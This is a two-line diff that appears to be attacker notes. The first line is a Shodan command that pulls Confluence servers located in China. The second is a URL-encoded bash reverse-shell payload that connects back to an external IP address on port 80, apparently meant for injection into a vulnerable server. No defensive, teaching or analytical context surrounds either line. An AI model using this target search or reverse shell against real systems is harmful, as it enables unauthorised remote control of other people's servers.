@@ -1,0 +1,2 @@
+shodan download --limit 10 myresults.json.gz 'country:"CN"' confluence
+bash%20-i%20>&%20/dev/tcp/35.236.161.97/80%200>&1
